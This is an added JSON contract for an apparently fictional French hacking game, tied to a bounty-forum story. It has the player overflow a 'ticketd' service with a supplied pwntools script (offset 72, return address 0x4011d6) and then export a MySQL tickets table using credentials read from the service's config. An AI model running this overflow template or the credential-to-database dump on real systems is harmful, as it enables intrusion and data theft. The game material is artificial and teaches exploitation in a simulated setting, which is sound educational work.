@@ -1,0 +1,175 @@
+{
+  "contract_id": "act1_service",
+  "scenario": "act1_service",
+  "tier": 1,
+  "channel": "chordly",
+  "client": {
+    "handle": "nullroute",
+    "forum_rep": 42,
+    "account_age_days": 284
+  },
+  "bounty": {
+    "forum": "breachboard",
+    "title": "07 — Un service fragile",
+    "body": "0xvanta m’a parlé de tes vérifications. Le service ticketd de cette image donne accès aux tickets de maintenance. Il faut récupérer les tickets, sans lire les autres tables."
+  },
+  "brief": "0xvanta m’a parlé de tes vérifications. Le service ticketd permet d’atteindre des tickets de maintenance. Je demande seulement les tickets, sans les autres tables. Cible connue : 10.61.7.30.\n\nNouveau : lire les protections et symboles d’un binaire, puis utiliser le script du laboratoire. Ce passage est accompagné : on ne te demande pas d’écrire un exploit. Lis ~/lab/README.txt, ~/mission/reperes.txt et le fil ticketd. checksec décrit les protections ; gdb affiche les symboles. Une observation sert à choisir les paramètres du script, pas à deviner une adresse.\n\nAprès l’accès, vérifie ton identité et lis les notes du service pour préparer une requête SQL limitée aux tickets. Conserve et relis l’export dans ~/loot, puis confirme « livraison TK-26 tickets ». Le nom est libre. Demande indice à chaque phase ; rappel détaillé donne les commandes de la phase en cours. Aucun achat requis.",
+  "reward": 480,
+  "reputation": 45,
+  "required_items": [],
+  "success_message": "Livraison vérifiée. {reward} ₵ annoncés au contrat ; le règlement exact figure dans ton profil. Merci {handle}, je conserve tes preuves.",
+  "failure_message": "Dossier interrompu. Reprends une sauvegarde ou relance le contrat pour retenter le parcours.",
+  "guide": [],
+  "investigation_steps": [
+    {
+      "id": "tickets_livres",
+      "tokens": [
+        "livraison",
+        "TK-26",
+        "tickets"
+      ],
+      "requires": [
+        {
+          "type": "forum_read",
+          "thread": "act1-ticketd"
+        },
+        {
+          "type": "tool_fact",
+          "key": "lab:checksec"
+        },
+        {
+          "type": "tool_fact",
+          "key": "lab:symbols"
+        },
+        {
+          "type": "tool_fact",
+          "key": "lab:access"
+        },
+        {
+          "type": "file_read",
+          "host": "ticket-app",
+          "path": "/etc/ticketd/database.ini"
+        },
+        {
+          "type": "tool_fact",
+          "key": "mysql:query:ticketing"
+        },
+        {
+          "type": "table_export",
+          "database": "ticketing",
+          "table": "tickets",
+          "path": "/home/operator/loot/tickets.tsv",
+          "format": "tsv",
+          "any_path": true,
+          "inspected": true
+        }
+      ],
+      "response": "Les tickets sont reçus. Le compte du service est limité ; l’accès SQL a conservé ce périmètre. J’ai un autre dossier, mais il faudra d’abord vérifier mon brief.",
+      "missing": "Il manque une observation vérifiable. Lis le fil : offset 72. Les symboles donnent l’adresse de maintenance. Le script se lance depuis Kali. Dans la session, cat /etc/ticketd/database.ini fournit le compte SQL ; une autre console Kali permet mysql avec SELECT * FROM tickets; et redirection vers ~/loot/tickets.tsv.",
+      "already": "Cette étape est déjà enregistrée.",
+      "hint": "Lis le fil : offset 72. Les symboles donnent l’adresse de maintenance. Le script se lance depuis Kali. Dans la session, cat /etc/ticketd/database.ini fournit le compte SQL ; une autre console Kali permet mysql avec SELECT * FROM tickets; et redirection vers ~/loot/tickets.tsv.",
+      "hints": [
+        "Commence par les pièces et le fil du laboratoire : comprendre le service précède l’exécution du script.",
+        "Compare les protections et les symboles observés avec le script fourni. Après l’accès, lis la configuration et limite la requête aux tickets."
+      ],
+      "help_stages": [
+        {
+          "id": "observer",
+          "requires": [
+            {
+              "type": "forum_read",
+              "thread": "act1-ticketd"
+            },
+            {
+              "type": "tool_fact",
+              "key": "lab:checksec"
+            },
+            {
+              "type": "tool_fact",
+              "key": "lab:symbols"
+            }
+          ],
+          "hints": [
+            "Ce laboratoire fournit un script : commence par comprendre ses paramètres, sans le lancer au hasard.",
+            "Le README et le fil donnent l’offset ; checksec décrit les protections et gdb les symboles."
+          ],
+          "hint": "Lis `cat ~/lab/README.txt` et le fil ticketd. Dans Kali : `checksec --file=/home/operator/lab/ticketd`, puis `gdb -q /home/operator/lab/ticketd -ex \"info functions\" -ex quit`. Relève l’adresse de maintenance ; le fil fournit l’offset."
+        },
+        {
+          "id": "session",
+          "requires": [
+            {
+              "type": "tool_fact",
+              "key": "lab:access"
+            }
+          ],
+          "hints": [
+            "Le symbole de maintenance et l’offset observés servent au script fourni. L’accès obtenu restera limité.",
+            "Le script attend --host, --port, --offset et --ret. Utilise une console Kali dédiée ; une autre restera locale."
+          ],
+          "hint": "Dans une console Kali : `python3 ~/lab/ticketd.py --host 10.61.7.30 --port 5000 --offset 72 --ret 0x4011d6`. Les valeurs viennent du fil et des symboles. Cette console devient la session distante ; vérifie ensuite `whoami` et lis les notes de son répertoire."
+        },
+        {
+          "id": "configuration",
+          "requires": [
+            {
+              "type": "file_read",
+              "host": "ticket-app",
+              "path": "/etc/ticketd/database.ini"
+            }
+          ],
+          "hints": [
+            "Une session de service n’est pas un accès à toutes les données. Cherche son périmètre.",
+            "Les notes du compte indiquent sa configuration ; root reste hors de portée."
+          ],
+          "hint": "Dans la session distante : `cat /home/svc.ticket/README.txt`, puis `cat /etc/ticketd/database.ini`. Relève hôte, base, compte et secret pour la prochaine phase ; garde une autre console locale."
+        },
+        {
+          "id": "tickets",
+          "requires": [
+            {
+              "type": "tool_fact",
+              "key": "mysql:query:ticketing"
+            },
+            {
+              "type": "table_export",
+              "database": "ticketing",
+              "table": "tickets",
+              "path": "/home/operator/loot/tickets.tsv",
+              "format": "tsv",
+              "any_path": true,
+              "inspected": true
+            }
+          ],
+          "hints": [
+            "Le compte SQL est limité. Ne demande que les tickets ; garde le résultat puis relis-le.",
+            "Dans une console Kali distincte, utilise le client MySQL avec les valeurs de la configuration et une requête SELECT sur tickets."
+          ],
+          "hint": "Dans Kali : `mysql -h 10.61.7.10 -u ticket_ro -p -D ticketing -e \"SELECT * FROM tickets;\" > ~/loot/tickets.tsv`. Saisis ensuite le secret lu dans database.ini, puis `cat ~/loot/tickets.tsv`. Confirme la livraison TK-26 des tickets après cette lecture."
+        }
+      ]
+    }
+  ],
+  "local_files": {
+    "/home/operator/lab/README.txt": "ticketd 0.9 — image pédagogique\nBinaire : /home/operator/lab/ticketd\nScript : /home/operator/lab/ticketd.py\nExaminer : checksec --file=/home/operator/lab/ticketd\nSymboles : gdb -q /home/operator/lab/ticketd -ex \"info functions\" -ex quit\nLire aussi le fil ticketd pour l’offset ; rien n’exige une exploitation aveugle.\nLe script accepte --host, --port, --offset et --ret.\nAprès accès, lire /home/svc.ticket/README.txt puis la configuration ; root reste hors de portée.\nMySQL : mysql -h hote -u compte -p -D base -e \"SELECT ...\" > fichier ; saisir le secret ensuite.\n",
+    "/home/operator/lab/ticketd": "ELF-VIRTUAL:ticketd-0.9-amd64\n",
+    "/home/operator/lab/ticketd.py": "# Script de laboratoire fourni : ticketd 0.9, amd64, protocole fictif.\n# Arguments : --host --port --offset --ret. Le terminal du jeu le modélise sans lancer Python.\nimport argparse\nfrom pwn import remote, p64\np = argparse.ArgumentParser()\np.add_argument('--host', required=True)\np.add_argument('--port', type=int, required=True)\np.add_argument('--offset', type=int, required=True)\np.add_argument('--ret', type=lambda x: int(x, 0), required=True)\na = p.parse_args()\nio = remote(a.host, a.port)\nio.sendline(b'A' * a.offset + p64(a.ret))\nio.interactive()\n",
+    "/home/operator/mission/reperes.txt": "checksec décrit les protections ; NX actif empêche l’exécution directe sur la pile, il ne prouve pas que le service est sûr. Un symbole est un nom associé à une adresse. L’offset est le nombre d’octets avant la zone visée, fourni dans le fil du laboratoire. --ret attend l’adresse du symbole de maintenance observé. Le script et le service sont fictifs. Après accès, whoami indique le compte ; le compte de service n’est pas root. Une console locale distincte sert au client MySQL ; -p demande le mot de passe sans l’inscrire dans la commande.\n\nIndice : une piste de raisonnement puis une aide concrète. Rappel détaillé : les commandes de la phase actuelle. L’aide ne retire aucune prime. Les commandes se saisissent dans les consoles du jeu, une par une.\n"
+  },
+  "investigation_threads": [
+    "act1-partages",
+    "act1-echantillon-annonce",
+    "act1-pivoine",
+    "act1-verre",
+    "act1-ticketd"
+  ],
+  "private_offer": true,
+  "intro": "On m’a recommandé ton pseudo. 0xvanta m’a parlé de tes vérifications. Le service ticketd de cette image donne accès aux tickets de maintenance. Il faut récupérer les tickets, sans lire les autres tables. Ouvre le dossier pour recevoir les pièces ; la suite se passe dans notre conversation Chordly.",
+  "relaxed_clock": true,
+  "side_job": false,
+  "chapter": 7,
+  "required_completed": [
+    "act1_empreinte"
+  ],
+  "terminal_revision": 2
+}
